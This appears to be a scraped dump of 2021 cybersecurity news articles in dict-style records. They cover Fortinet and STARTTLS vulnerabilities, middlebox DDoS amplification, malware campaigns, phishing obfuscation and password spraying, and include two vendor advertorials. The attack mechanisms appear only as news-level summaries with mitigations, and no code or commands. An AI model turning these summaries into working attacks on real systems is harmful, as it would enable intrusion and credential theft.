DMZ.“\nRapid7 also warns that while authentication is a prerequisite for achieving arbitrary command execution, the exploit could be chained with an authentication bypass flaw, such as CVE-2020-29015. In the interim, users are advised to block access to the FortiWeb device’s management interface from untrusted networks, including taking steps to prevent direct exposure to the internet.\n\nAlthough there is no evidence that the new security issue has been exploited in the wild, it’s worth noting that unpatched Fortinet servers have been a lucrative target for financially motivated and state-sponsored threat actors alike.\nEarlier this April, the Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) warned of advanced persistent threat groups targeting Fortinet FortiOS servers by leveraging CVE-2018-13379, CVE-2020-12812, and CVE-2019-5591 to compromise systems belonging to government and commercial entities.\nIn the same month, Russian cybersecurity company Kaspersky revealed that threat actors exploited the CVE-2018-13379 vulnerability in FortiGate VPN servers to gain access to enterprise networks in European countries to deploy the Cring ransomware.\nUpdate: Fortinet shared the following statement with The Hacker News:\n“The security of our customers is always our first priority. Fortinet recognizes the important role of independent security researchers who work closely with vendors to protect the cybersecurity ecosystem in alignment with their responsible disclosure policies. In addition to directly communicating with researchers, our disclosure policy is clearly outlined on the Fortinet PSIRT Policy page, which includes asking incident submitters to maintain strict confidentiality until complete resolutions are available for customers. As such, we had expected that Rapid7 hold any findings prior to the end of our 90-day Responsible disclosure window. We regret that in this instance, individual research was fully disclosed without adequate notification prior to the 90-day window. We are working to deliver immediate notification of a workaround to customers and a patch released by the end of the week.”\n\n\nFound this article interesting?

'text': 'A new social engineering-based malvertising campaign targeting Japan has been found to deliver a malicious application that deploys a banking trojan on compromised Windows machines to steal credentials associated with cryptocurrency accounts.\nThe application masquerades as an animated porn game, a reward points application, or a video streaming application, Trend Micro researchers Jaromir Horejsi and Joseph C Chen said in an analysis published last week, attributing the operation to a threat actor it tracks as Water Kappa, which was previously found targeting Japanese online banking users with the Cinobi trojan by leveraging exploits in Internet Explorer browser.\n\nThe switch in tactics is an indicator that the adversary is singling out users of web browsers other than Internet Explorer, the researchers added.\n\nWater Kappa’s latest infection routine commences with malvertisements for either Japanese animated porn games, reward points apps, or video streaming services, with the landing pages urging the victim to download the application — a ZIP archive containing files from an older version of the “Logitech Capture“ application dated 2018, but also featuring modified files that are orchestrated to decrypt and run shellcode that, in turn, triggers the execution of the Cinobi banking trojan.\n\nIn addition to geofencing access to the malvertisement portals from non-Japanese IP addresses, the trojan is designed to pilfer usernames and passwords for 11 Japanese financial institutions, three of which are involved in cryptocurrency trading. In the event, a user visits one of the targeted websites, Cinobi’s form-grabbing module is activated to capture the filled-in information in the login screens. \n“The new malvertising campaign shows that Water Kappa is still active and continuously evolving their tools and techniques for greater financial gain — this one also aims to steal cryptocurrency,“ the researchers said. “In order to minimise the chances of being infected, users need to be wary of suspicious advertisements on shady websites, and as much as possible, download applications only from trusted sources.“\n\n\nFound this article interesting?

{'title': 'Solution Providers Can Now Add Incident Response to Their Services Portfolio For Free',
'text': 'The Incident Response (IR) services market is in accelerated growth due to the rise in cyberattacks that result in breaches. More and more organizations, across all sizes and verticals, choose to outsource IR to 3rd party service providers over handling security incidents in-house.\n\nCynet is now launching a first-of-its-kind offering, enabling any Managed Security Provider (MSP) or Security Integrator (SI) to add Incident Response to its services portfolio, without building an in-house team of incident responders, by using Cynet’s IR team and technology at no cost. \n\nManaged Service providers interested to add Incident Response to their service portfolio with no investment in people or technology can apply here.\n\nAs cyber threats grow in sophistication and volume, there is an increasing number of cases in which attackers succeed in compromising the environments they target. This, in turn, fuels a rapidly growing demand for IR technologies and services.\n\nSince in most cases the response to a suspected attack requires skills in fields such as forensics, reverse engineering and other investigation skills that are not part of the standard IT workforce’s expertise, many organizations prefer to put their trust in a professional 3rd party that specializes in providing IR services.\n\nHowever, while the demand for IR services is high, only a small part of MSPs and SIs provide IR services. All others that provide standard IT and security services such as deployment, integration, and management, don’t offer IR services due to the difficulties in recruiting a team of skilled responders.\n\nCynet now launches a new offering, enabling existing IT and security service providers to add IR to their offered services cart without having their own in-house team of security experts.\n\nWith this offering, the service providers can sell IR services to their customers, and when an incident occurs, engage the Cynet CyOps security team, who install the Cynet 360 platform across the customer environment within minutes, and conduct a rapid and efficient investigation and response, until the environment is clean again.  \n\nOn top of the explicit benefit of adding IR services to its offering with zero investment, after the incident response process is over, MSPs and SIs have the option to leverage the momentum of having Cynet 360 already deployed and working on the customer environment to showcase the full value proposition of the platform and sell the Cynet 360 breach protection platform on a yearly subscription base.\n\nManaged Service Providers that want to learn more on how to include Incident Response in their services at no cost can apply here.\n\n\nAbout CyOps:\nCyOps is a team of handpicked security analysts and threat researchers that respond to events on a daily basis through Cynet’s Security Operations Center.\n\nCyOps’ vast cybersecurity experience warrants rapid and efficient operation across environments of all types and sizes.\n\n\nAbout Cynet 360:\nCyOps uses Cynet 360 Autonomous Breach Protection as their default IR platform when engaging with an environment under attack.\n\nCynet 360 instantly collects and correlates all the endpoint, network and user data from the environment, enabling CyOps to pinpoint suspicious entities and connections, investigate to unveil root-cause, scope, and impact, and remove malicious presence and activity.\n\nThese responders’ expertise and Cynet 360’s cutting-edge IR technology magnify one another, to deliver IR with unmatched quality and efficiency.\n\n\nFound this article interesting?

The same threat actor behind this Mirai-based botnet has also been linked to a string of attacks at least since February 2021, leveraging newly disclosed flaws in network security appliances and home routers to their advantage.\n“This chain of events shows that hackers are actively looking for command injection vulnerabilities and use them to propagate widely used malware quickly,“ network security firm SAM Seamless Network said last week. “These kinds of vulnerabilities are easy to exploit and can be integrated quickly into existing hacking frameworks that attackers employ, well before devices are patched and security vendors can react.“\n\n\nFound this article interesting?

{'title': 'Attackers Can Weaponize Firewalls and Middleboxes for Amplified DDoS Attacks',
'text': 'Weaknesses in the implementation of TCP protocol in middleboxes and censorship infrastructure could be weaponized as a vector to stage reflected denial of service (DoS) amplification attacks against any target, surpassing many of the existing UDP-based amplification factors to date.\nDetailed by a group of academics from the University of Maryland and the University of Colorado Boulder at the USENIX Security Symposium, the volumetric attacks take advantage of TCP-non-compliance in-network middleboxes — such as firewalls, intrusion prevention systems, and deep packet inspection (DPI) boxes — to amplify network traffic, with hundreds of thousands of IP addresses offering amplification factors exceeding those from DNS, NTP, and Memcached.\n\nThe research, which received a Distinguished Paper Award at the conference, is the first of its kind to describe a technique to carry out DDoS reflected amplification attacks over the TCP protocol by abusing middlebox misconfigurations in the wild, a method previously deemed effective at preventing such spoofing attacks.\nReflected amplification attacks are a type of DoS attacks in which an adversary leverages the connectionless nature of UDP protocol with spoofed requests to misconfigured open servers in order to overwhelm a target server or network with a flood of packets, causing disruption or rendering the server and its surrounding infrastructure inaccessible. This typically occurs when the response from the vulnerable service is larger than the spoofed request, which can then be leveraged to send thousands of these requests, thereby significantly amplifying the size and bandwidth issued to the target.\n\nWhile DoS amplifications are traditionally UDP-based owing to complications arising out of TCP’s three-way handshake to set up a TCP/IP connection over an IP based network (SYN, SYN+ACK, and ACK), the researchers found that a large number of network middleboxes do not conform to the TCP standard, and that they can “respond to spoofed censored requests with large block pages, even if there is no valid TCP connection or handshake,“ turning the devices into attractive targets for DoS amplification attacks.\n“Middleboxes are often not TCP-compliant by design: many middleboxes attempt [to] handle asymmetric routing, where the middlebox can only see one direction of packets in a connection (e.g., client to server),“ the researchers said. “But this feature opens them to attack: if middleboxes inject content based only on one side of the connection, an attacker can spoof one side of a TCP three-way handshake, and convince the middlebox there is a valid connection.“\nPut differently, the mechanism hinges on tricking the middlebox into injecting a response without completing the three-way handshake, subsequently using it to access a forbidden domain such as pornography, gambling, and file sharing sites, causing the middlebox to respond with a block page, which would be much larger than the censored requests, thus resulting in an amplification.\n\nWhat’s more, not only do these amplified responses come predominantly from middleboxes, a chunk of those network inspection equipment are nation-state censorship apparatus, highlighting the role played by such infrastructure in enabling governments to suppress access to the information within their borders, and worse, allow adversaries to weaponize the networking devices to attack any victim on the internet.\n“Nation-state censorship infrastructure is located at high-speed ISPs, and is capable of sending and injecting data at incredibly high bandwidths,“ the researchers said. “This allows an attacker to amplify larger amounts of traffic without worry of amplifier saturation. Second, the enormous pool of source IP addresses that can be used to trigger amplification attacks makes it difficult for victims to simply block a handful of reflectors. Nation-state censors effectively turn every routable IP addresses (sic) within their country into a potential amplifier.“\n“Middleboxes introduce an unexpected, as-yet untapped threat that attackers could leverage to launch powerful DoS attacks,“ the researchers added. “Protecting the Internet from these threats will require concerted effort from many middlebox manufacturers and operators.“\n\n\nFound this article interesting?

{'title': 'Dozens of STARTTLS Related Flaws Found Affecting Popular Email Clients',
'text': 'Security researchers have disclosed as many as 40 different vulnerabilities associated with an opportunistic encryption mechanism in mail clients and servers that could open the door to targeted man-in-the-middle (MitM) attacks, permitting an intruder to forge mailbox content and steal credentials.\nThe now-patched flaws, identified in various STARTTLS implementations, were detailed by a group of researchers Damian Poddebniak, Fabian Ising, Hanno Böck, and Sebastian Schinzel at the 30th USENIX Security Symposium. In an Internet-wide scan conducted during the study, 320,000 email servers were found vulnerable to what’s called a command injection attack.\n\nSome of the popular clients affected by the bugs include Apple Mail, Gmail, Mozilla Thunderbird, Claws Mail, Mutt, Evolution, Exim, Mail.ru, Samsung Email, Yandex, and KMail. The attacks require that the malicious party can tamper connections established between an email client and the email server of a provider and has login credentials for their own account on the same server.\nSTARTTLS refers to a form of opportunistic TLS that enables email communication protocols such as SMTP, POP3, and IMAP to be transitioned or upgraded from a plain text connection to an encrypted connection instead of having to use a separate port for encrypted communication.\n“Upgrading connections via STARTTLS is fragile and vulnerable to a number of security vulnerabilities and attacks,“ the researchers noted, allowing a meddler-in-the-middle to inject plaintext commands that a “server would be interpret as if they were part of the encrypted connection,“ thereby enabling the adversary to steal credentials with the SMTP and IMAP protocols.\n“Email clients must authenticate themselves with a username and password before submitting a new email or accessing existing emails. For these connections, the transition to TLS via STARTTLS must be strictly enforced because a downgrade would reveal the username and password and give an attacker full access to the email account,“ the researchers added.\nIn an alternative scenario that could facilitate mailbox forgery, by inserting additional content to the server message in response to the STARTTLS command before the TLS handshake, the client can be tricked into processing server commands as if they were part of the encrypted connection. The researchers dubbed the attack “response injection.“\n\nThe last line of attack concerns IMAP protocol, which defines a standardized way for email clients to retrieve email messages from a mail server over a TCP/IP connection. A malicious actor can bypass STARTTLS in IMAP by sending a PREAUTH greeting — a response that indicates that the connection has already been authenticated by external means — to prevent the connection upgrade and force a client to an unencrypted connection.\nStating that implicit TLS is a more secure option than STARTTLS, the researchers recommend users to configure their email clients to use SMTP, POP3 and IMAP with implicit TLS on dedicated ports (port 465, port 995, and port 993 respectively), in addition to urging developers of email server and client applications to offer implicit TLS by default.\n“The demonstrated attacks require an active attacker and may be recognized when used against an email client that tries to enforce the transition to TLS,“ the researchers said. “As a general recommendation you should always update your software and (to also profit from faster connections) reconfigure your email client to use implicit TLS only.“\n\n\nFound this article interesting?

'text': 'A new wave of attacks involving a notorious macOS adware family has evolved to leverage around 150 unique samples in the wild in 2021 alone, some of which have slipped past Apple’s on-device malware scanner and even signed by its own notarization service, highlighting the malicious software ongoing attempts to adapt and evade detection.\n“AdLoad,“ as the malware is known, is one of several widespread adware and bundleware loaders targeting macOS since at least 2017. It’s capable of backdooring an affected system to download and install adware or potentially unwanted programs (PUPs), as well as amass and transmit information about victim machines.\n\nThe new iteration “continues to impact Mac users who rely solely on Apple’s built-in security control XProtect for malware detection,“ SentinelOne threat researcher Phil Stokes said in an analysis published last week. “As of today, however, XProtect arguably has around 11 different signatures for AdLoad [but] the variant used in this new campaign is undetected by any of those rules.“\nThe 2021 version of AdLoad latches on to persistence and executable names that use a different file extension pattern (.system or .service), enabling the malware to get around additional security protections incorporated by Apple, ultimately resulting in the installation of a persistence agent, which, in turn, triggers an attack chain to deploy malicious droppers that masquerade as a fake Player.app to install malware.\n\nWhat’s more, the droppers are signed with a valid signature using developer certificates, prompting Apple to revoke the certificates “within a matter of days (sometimes hours) of samples being observed on VirusTotal, offering some belated and temporary protection against further infections by those particular signed samples by means of Gatekeeper and OCSP signature checks,“ Stokes noted.\n\nSentinelOne said it detected new samples signed with fresh certificates in a couple of hours and days, calling it a “game of whack-a-mole.“ First samples of AdLoad are said to have appeared as early as November 2020, with regular further occurrences across the first half of 2021, followed by a sharp uptick throughout July and, in particular, the early weeks of August 2021.\nAdLoad is among the malware families, alongside Shlayer, that’s been known to bypass XProtect and infect Macs with other malicious payloads. In April 2021, Apple addressed an actively exploited zero-day flaw in its Gatekeeper service (CVE-2021-30657) that was abused by the Shlayer operators to deploy unapproved software on the compromised systems.\n“Malware on macOS is a problem that the device manufacturer is struggling to cope with,“ Stokes said. “The fact that hundreds of unique samples of a well-known adware variant have been circulating for at least 10 months and yet still remain undetected by Apple’s built-in malware scanner demonstrates the necessity of adding further endpoint security controls to Mac devices.“\n\n\nFound this article interesting?

{'title': 'New Glowworm Attack Recovers Device’s Sound from Its LED Power Indicator',
'text': 'A novel technique leverages optical emanations from a device’s power indicator LED to recover sounds from connected peripherals and spy on electronic conversations from a distance of as much as 35 meters.\nDubbed the “Glowworm attack,“ the findings were published by a group of academics from the Ben-Gurion University of the Negev earlier this week, describing the method as “an optical TEMPEST attack that can be used by eavesdroppers to recover sound by analysing optical measurements obtained via an electro-optical sensor directed at the power indicator LED of various devices.“\nAccompanying the experimental setup is an optical-audio transformation (OAT) that allows for retrieving sound by isolating the speech from the optical measurements obtained by directing an electro-optical sensor at the device’s power indicator LED.\n\nTEMPEST is the codename for unintentional intelligence-bearing emanations produced by electronic and electromechanical information-processing equipment. Glowworm builds on a similar attack called Lamphone that was demonstrated by the same researchers last year and enables the recovery of sound from a victim’s room that contains an overhead hanging bulb.\nWhile both methods retrieve sound from light via an electro-optical sensor, they are also different in that while the Lamphone attack “is a side-channel attack that exploits a light bulb’s miniscule vibrations, which are the result of sound waves hitting the bulb,“ Glowworm is a “TEMPEST attack that exploits the way that electrical circuits were designed. It can recover sound from devices like USB hub splitters that do not move in response to the acoustic information played by the speakers.“\nThe attack hinges on the optical correlation between the sound that is played by connected speakers and the intensity of their power indicator LED, which are not only connected directly to the power line but also that the intensity of a device’s power indicator LED is influenced by the power consumption. What’s more, the quality of the sound recovered is proportional to the quality of the equipment used by the eavesdropper.\n\nIn a real-world scenario, the threat model takes aim at the speech generated by participants in a virtual meeting platform such as Zoom, Google Meet, and Microsoft Teams, with the malicious party located in a room in an adjacent building, enabling the adversary to recover sound from the power indicator LED of the speakers.\n\nIn an indirect attack scenario where the power indicator LED isn’t visible from outside the room, the eavesdropper can recover sound from the power indicator LED of the device used to provide the power to the speaker.\nAlthough such attacks can be countered on the consumer side by placing a black tape over a device’s power indicator LED, the researchers recommend device manufacturers to integrate a capacitor or an operational amplifier to eliminate the power consumption fluctuations that occur when the speakers produce sound.\n“While the cost of our countermeasures might seem negligible, given the likelihood that the devices are mass produced, the addition of a component to prevent the attack could cost a manufacturer millions of dollars,“ the researchers said. “Given the cost-driven nature of consumers and the profit-driven nature of manufacturers, known vulnerabilities are often ignored as a means of reducing costs. This fact may leave many electrical circuits vulnerable to Glowworm attack for years to come.“\n\n\nFound this article interesting?

{'title': 'Facebook Adds End-to-End Encryption for Audio and Video Calls in Messenger',
'text': 'Facebook on Friday said it’s extending end-to-end encryption (E2EE) for voice and video calls in Messenger, along with testing a new opt-in setting that will turn on end-to-end encryption for Instagram DMs.\n“The content of your messages and calls in an end-to-end encrypted conversation is protected from the moment it leaves your device to the moment it reaches the receiver’s device,“ Messenger’s Ruth Kricheli said in a post. “This means that nobody else, including Facebook, can see or listen to what’s sent or said. Keep in mind, you can report an end-to-end encrypted message to us if something’s wrong.“\nThe social media behemoth said E2EE is becoming the industry standard for improved privacy and security.\n\nIt’s worth noting that the company’s flagship messaging service gained support for E2EE in text chats in 2016, when it added a “secret conversation“ option to its app, while communications on its sister platform WhatsApp became fully encrypted the same year following the integration of Signal Protocol into the application.\nIn addition, the company is also expected to kick off a limited test in certain countries that lets users opt-in to end-to-end encrypted messages and calls for one-on-one conversations on Instagram.\nThe moves are part of Facebook’s pivot to a privacy-focused communications platform the company announced in March 2019, with CEO Mark Zuckerberg stating that the “future of communication will increasingly shift to private, encrypted services where people can be confident what they say to each other stays secure and their messages and content won’t stick around forever.“\nThe changes have since set off concerns that full encryption could create digital hiding places for perpetrators, what with Facebook accounting for over 90% of the illicit and child sexual abuse material (CSAM) flagged by tech companies, while also posing a significant challenge when it comes to balancing the need for preventing its platforms from being used for criminal or abusive activities while also upholding privacy.\nThe development also comes a week after Apple announced plans to scan users’ photo libraries for CSAM content as part of a sweeping child safety initiative that has been subject to ample pushback from users, security researchers, the Electronic Frontier Foundation (EFF), and even Apple employees, prompting concerns that the proposals could be ripe for further abuse or create new risks, and that “even a thoroughly documented, carefully thought-out, and the narrowly-scoped backdoor is still a backdoor.“\n\nThe iPhone maker, however, has defended its system, adding it intends to incorporate further protections to safeguard the technology from being taken advantage of by governments or other third parties with “multiple levels of auditability,“ or reject any government demands to repurpose the technology for surveillance purposes.\n“If and only if you meet a threshold of something on the order of 30 known child pornographic images matching, only then does Apple know anything about your account and know anything about those images, and at that point, only knows about those images, not about any of your other images,“ Apple’s senior vice president of software engineering, Craig Federighi, said in an interview with the Wall Street Journal.\n“This isn’t doing some analysis for did you have a picture of your child in the bathtub? Or, for that matter, did you have a picture of some pornography of any other sort? This is literally only matching on the exact fingerprints of specific known child pornographic images,“ Federighi explained.\n\n\nFound this article interesting?

'text': 'Microsoft has disclosed details of an evasive year-long social engineering campaign wherein the operators kept changing their obfuscation and encryption mechanisms every 37 days on average, including relying on Morse code, in an attempt to cover their tracks and surreptitiously harvest user credentials.\nThe phishing attacks take the form of invoice-themed lures mimicking financial-related business transactions, with the emails containing an HTML file (“XLS.HTML“). The ultimate objective is to harvest usernames and passwords, which are subsequently used as an initial entry point for later infiltration attempts.\n\nMicrosoft likened the attachment to a “jigsaw puzzle,“ noting that individual parts of the HTML file are designed to appear innocuous and slip past endpoint security software, only to reveal its true colors when these segments are decoded and assembled together. The company did not identify the hackers behind the operation.\n“This phishing campaign exemplifies the modern email threat: sophisticated, evasive, and relentlessly evolving,“ Microsoft 365 Defender Threat Intelligence Team said in an analysis. “The HTML attachment is divided into several segments, including the JavaScript files used to steal passwords, which are then encoded using various mechanisms. These attackers moved from using plaintext HTML code to employing multiple encoding techniques, including old and unusual encryption methods like Morse code, to hide these attack segments\n\nOpening the attachment launches a browser window that displays a fake Microsoft Office 365 credentials dialog box on top of a blurred Excel document. The dialog box shows a message urging the recipients to sign in again due to reasons that their access to the Excel document has purportedly timed out. In the event the user enters the password, the individual is alerted that the typed password is incorrect, while the malware stealthily harvests the information in the background.\n\nThe campaign is said to have undergone 10 iterations since its discovery in July 2020, with the adversary periodically switching up its encoding methods to mask the malicious nature of the HTML attachment and the different attack segments contained within the file. \nMicrosoft said it detected the use of Morse code in the attacks’ February and May 2021 waves, while later variants of the phishing kit were found to direct the victims to a legitimate Office 365 page instead of showing a fake error message once the passwords were entered.\n“Email-based attacks continue to make novel attempts to bypass email security solutions,“ the researchers said. “In the case of this phishing campaign, these attempts include using multilayer obfuscation and encryption mechanisms for known existing file types, such as JavaScript. Multilayer obfuscation in HTML can likewise evade browser security solutions.\n\n\nFound this article interesting?

{'title': 'Why Is There A Surge In Ransomware Attacks?',
'text': 'The U.S. is presently combating two pandemics--coronavirus and ransomware attacks. Both have partially shut down parts of the economy. However, in the case of cybersecurity, lax security measures allow hackers to have an easy way to rake in millions.\nIt’s pretty simple for hackers to gain financially, using malicious software to access and encrypt data and hold it hostage until the victim pays the ransom.\nCyber attacks are more frequent now because it is effortless for hackers to execute them. Further, the payment methods are now friendlier to them. In addition, businesses are willing to pay a ransom because of the growing reliance on digital infrastructure, giving hackers more incentives to attempt more breaches. \nBolder cybercriminals\nA few years back, cybercriminals played psychological games before getting bank passwords and using their technical know-how to steal money from people’s accounts. They are bolder now because it is easy for them to buy ransomware software-as-a-service and learn hacking techniques from online video-sharing sites, like YouTube. Some cyber gangs are even offering their services for a business hacking set up for a fee, typically a share of the profits. \nCryptocurrency made the hackers bolder, as they can extort unlimited and anonymous cash payments. With the anonymity of bitcoin transfers, hackers found out they can demand higher amounts from their victims. \nYou can also blame the rise in cyberattacks on the behavior of some firms that are willing to pay millions of dollars in bitcoin. However, attacks will stop if firms and data security experts ensure that hacking will not be profitable anymore.\nAre cyber attacks getting a higher profile or actually rising?\nThe answer to both questions is yes. Ransomware is becoming more common because it is straightforward to execute. Hackers use software to poke around security holes or by tricking network users using phishing scam tactics like sending malware that seem to come from a trusted source. In addition, some large companies have been lax with their network security protocols, which cybersecurity experts learned recently. \nOne such case is the supply chain attack at Colonial Pipeline, whose CEO Joseph Blount admitted before Congress that the company does not use multifactor authentication when users log in.\nBased on the Internet Crime Report released in 2020, the FBI received close to 2,500 ransomware reports in 2020, 20 percent higher than the reported cases in 2019. The FBI also noted that the collective cost of the ransomware attacks in 2020 was close to $29.1 million. It is equivalent to a 200 percent increase over 2019, wherein the cost reached $8.9 million. \nAnother contributing factor to the rise in ransomware attacks is the growing number of online users. The coronavirus pandemic caused a spike in worldwide internet usage. Many students and workers are working and learning remotely. \nCybercrime Magazine predicts that ransomware will cost victims about $265 billion each year starting 2031. Attacks are likely to occur every two seconds as hackers refine their malware attacks and extortion practices. \nImpact of ransomware on business\nWe already know how ransomware can have devastating effects on businesses, large or small. But it pays to be reminded time and again because even enterprises can become victims. Cybercriminals continue to exploit vulnerabilities in network security systems. In addition, many hacking gangs are using ransomware and denial-of-service attacks for financial gains. \nAside from the increasing occurrence of ransomware attacks, the cost of the attacks is growing as well. Ransomware paralyzes a company’s digital network and associated devices. Because sensitive business data is breached, business operations, particularly for supply chains, are affected--thus, companies prefer to pay a ransom. \nBut theoretically, even if the company pays ransom, there is no guarantee that the sensitive data has not been copied. Likewise, there is no guarantee that attackers will return all the data or that the decryption key will work. In the case of Colonial, the decryption key hackers gave them after paying the ransom was too slow. So Colonial resorted to using their backup files. Kaseya, on the other hand, preferred to work with a third party for a decryption key. \nPreventing ransomware infection\nThe FBI advises companies never to pay ransom to cybercriminals because it encourages them to launch more attacks. Some ways to prevent such attacks include:\nWorking with a cybersecurity firm that provides the best security system that fits a business’ current and future needs is one of your primary options.Staying vigilant is another way to thwart infection. If your systems are slowing down for no apparent reason, disconnect from the internet and shut it down. Then, you can call your network security provider and seek their help. The Biden administration encourages businesses to beef up their cybersecurity programs and review their corporate security plans. Further, you should cooperate with the FBI and the Ransomware and Digital Extortion Task Force of the U.S. Department of Justice. \nAside from the technical aspect of assuring cybersecurity, sometimes it pays to go back to basics.\nUse security training so your employees will have a better understanding of the importance and meaning of cybersecurity. In addition, employees should learn to ensure the protection of the entire company from cyber attacks. Train yourself and your staff not to click on links from unverified sources, as phishing emails are one of the methods to spread malware and make your company an easy target. Always scan emails, and notify employees of out-of-network emails. Practice creating regular backups of your data. Have at least two data backups and store them at separate locations. Grant access to your backup only to your most trusted staff. Use data encryption to protect emails, file exchanges, and personal information. Ensure that you upgrade all your applications regularly so you can fix vulnerabilities. Use password managers to ensure that all employees will have stronger passwords. Instruct employees to use different passwords to log in to the other applications you use in your company.\nConclusion\nRansomware attacks are rampant, due to their ease and profitability. Knowing about the activities of cybercriminal gangs and providing employee training on cybersecurity is vital. Combining technological expertise and basic security practices will help mitigate ransomware infection. However, it’s important not to panic and know the security measures you should follow. \n\n\nFound this article interesting?

{'title': 'Experts Shed Light On New Russian Malware-as-a-Service Written in Rust',
'text': 'A nascent information-stealing malware sold and distributed on underground Russian underground forums has been written in Rust, signalling a new trend where threat actors are increasingly adopting exotic programming languages to bypass security protections, evade analysis, and hamper reverse engineering efforts.\nDubbed “Ficker Stealer,“ it’s notable for being propagated via Trojanized web links and compromised websites, luring in victims to scam landing pages purportedly offering free downloads of legitimate paid services like Spotify Music, YouTube Premium, and other Microsoft Store applications.\n\n“Ficker is sold and distributed as Malware-as-a-Service (MaaS), via underground Russian online forums,“ BlackBerry’s research and intelligence team said in a report published today. “Its creator, whose alias is @ficker, offers several paid packages, with different levels of subscription fees to use their malicious program.“\nFirst seen in the wild in August 2020, the Windows-based malware is used to steal sensitive information, including login credentials, credit card information, cryptocurrency wallets, and browser information, in addition to functioning as a tool to grab sensitive files from the compromised machine, and act as a downloader to download and execute additional second-stage malware.\n\nAdditionally, Ficker is known to be delivered through spam campaigns, which involve sending targeted phishing emails with weaponized macro-based Excel document attachments that, when opened, drops the Hancitor loader, which then injects the final payload using a technique called process hollowing to avoid detection and mask its activities.\n\nIn the months that followed since its discovery, the digital threat has been found leveraging DocuSign-themed lures to install a Windows binary from an attacker-controlled server. CyberArk, in an analysis of the Ficker malware last month, noted its heavily obfuscated nature and Rust roots, making the analysis more difficult, if not prohibitive.\n\n“Once the fake DocuSign document is opened and its malicious macro code is allowed to run, Hancitor will often reach out to its command-and-control (C2) infrastructure to receive a malicious URL containing a sample of Ficker to download,“ BlackBerry researchers said.\nAside from relying on obfuscation techniques, the malware also incorporates other anti-analysis checks that prevent it from running on virtualized environments and on victim machines located in Armenia, Azerbaijan, Belarus, Kazakhstan, Russia, and Uzbekistan. Also worthy of particular note is that, unlike traditional information stealers, Ficker is designed to execute the commands and exfiltrate the information directly to the operators instead of writing the stolen data to disk.\n“The malware also has screen-capturing abilities, which allow the malware’s operator to remotely capture an image of the victim’s screen. The malware also enables file-grabbing and additional downloading capabilities once connection to its C2 is established,“ the researchers said. “Once information is sent back to Ficker’s C2, the malware owner can access and search for all exfiltrated data.“\n\n\nFound this article interesting?

{'title': 'How Companies Can Protect Themselves from Password Spraying Attacks',
'text': 'Attackers are using many types of attacks to compromise business-critical data. These can include zero-day attacks, supply chain attacks, and others. However, one of the most common ways that hackers get into your environment is by compromising passwords.\nThe password spraying attack is a special kind of password attack that can prove effective in compromising your environment. Let’s look closer at the password spraying attack and how organizations can prevent it.\nBeware of compromised credentials\nAre compromised credentials dangerous to your environment? Yes! Compromised credentials allow an attacker to “walk in the front door“ of your environment with legitimate credentials. They assume all the rights and permissions to systems, data, and resources the compromised account can access.\nThe compromise of a privileged account is even worse. Privileged accounts are accounts that have high levels of access, such as an administrator user account. These types of accounts represent the “holy grail“ to an attacker as they generally have the “keys to the kingdom“ in terms of access. For example, with an administrator account, an attacker can not only access systems but can also create other backdoors and high-level accounts that may be difficult to detect.\nAccording to the IBM Cost of a Data Breach Report 2021, “the most common initial attack vector in 2021 was compromised credentials, responsible for 20% of breaches.“ It continues: “Breaches caused by stolen/compromised credentials took the longest number of days to identify (250) and contain (91) on average, for an average total of 341 days.“\nThe longer it takes to identify an attack, they are more costly and damaging to a business, leading to an increased risk of a tarnished reputation and lost business. \nWhat is a password spraying attack?\nThe password spraying attack is a slightly different take on the brute force attack. In a typical brute force attack, an attacker tries an exponential number of passwords against a single account to crack that single account. With the password spraying attack, the attacker “sprays“ multiple accounts with the same password. \nMany businesses use Microsoft Active Directory Domain Services (ADDS) and account lockout policies. With the account lockout policy, administrators can set the number of failed login attempts before the account locks out for a specified duration. For example, lockout policies configure a low number of failed login attempts, such as five failed login attempts. The advantage of password spraying is that the attacker spreads the attack out over multiple accounts, which helps avoid account lockouts. \nPassword spraying attacks target multiple user accounts with a single commonly used password\nAttackers may target an environment with common passwords that are found as password defaults or found in known or breached password lists. If an attacker sprays these passwords across many user accounts, they are likely to find a user account configured with a known, breached, or default password.\nPrevent password spraying attacks\nAny credential compromise is undoubtedly a cybersecurity event that companies want to avoid at all costs. Password spraying is another tool in the attack arsenal of cybercriminals used to breach valuable or sensitive data. What steps can organizations take to prevent password spraying attacks in particular?\nAs with many cybersecurity threats, there is no one “silver bullet“ that prevents all types of attacks. Instead, password security involves a multi-layered approach that includes many mitigations. So, what do these mitigations include?\nEnforce account lockout policies limiting bad password attemptsEffective password policies enforcing good password hygieneUse breached password protectionImplement multi-factor authentication\n1 — Enforce account lockout policies limiting bad password attempts\nAs mentioned earlier, account lockout policies prevent an attacker from trying an infinite number of passwords against an account until they crack the password. \nOrganizations can configure a threshold of bad password attempts that lock the account for a specific time with an account lockout policy.\nWhile a password spraying attack attempts to bypass this mitigation and can prove successful, password lockout policies are a good line of defense against brute force attacks in general. Current cybersecurity best-practice standards recommend implementing password lockout policies.\n2 — Effective password policies enforcing good password hygiene\nPassword policies control the characteristics of passwords used in an environment. Weak passwords or passwords that are easily guessed are extremely dangerous for businesses for obvious reasons, but particularly the incredibly high cost of recovery.\nPassword policies allow companies to define the length, complexity, and content of passwords in their environments. Microsoft’s Active Directory Domain Services allow creating basic password policies used by most enterprise organizations today.\nHowever, it is limited in providing modern password policy features recommended, such as breached password protection and advanced password policy features. As a result, businesses must implement third-party solutions to effectively prevent the use of breached passwords and other weak passwords in the environment.\n3 — Use breached password protection\nBreached password protection is an essential cybersecurity protection mechanism for password credentials. Attackers can use previously breached password lists to attempt breaching the current accounts maintained by organizations. How does this work? \nAttackers know that different end-users commonly use the same passwords. Due to human nature, we all tend to think alike. Therefore, users tend to think of and use the same types of passwords. It means that lists of breached passwords most likely contain passwords that other users currently use for their user accounts.\nImplementing breached password protection means that organizations are scanning their Active Directory environments for passwords that have been found on breached password lists. However, as mentioned earlier, breached password protection is not a feature natively found in Active Directory. So, organizations must use third-party tools to implement this protection effectively.\n4 — Implement multi-factor authentication\nAlong with strong passwords with breached password protection, organizations do well to implement multi-factor authentication. Multi-factor authentication combines something you know (your password) with something you have (a hardware authentication device). \nMulti-factor authentication such as two-factor makes it exponentially harder for attackers to compromise credentials. Even if they guess or possess the password via a breach, they still do not have everything needed to authenticate (the second factor, such as a hardware device).\nModern password protection\nFor businesses looking to implement modern password protection in their Active Directory environment, third-party tools are needed to protect against breached passwords and bolster default Active Directory password policies. By increasing the cybersecurity posture by having more robust password protection, organizations can help to prevent password spraying attacks.\nSpecops Password Policy is a solution that allows organizations to improve their password security 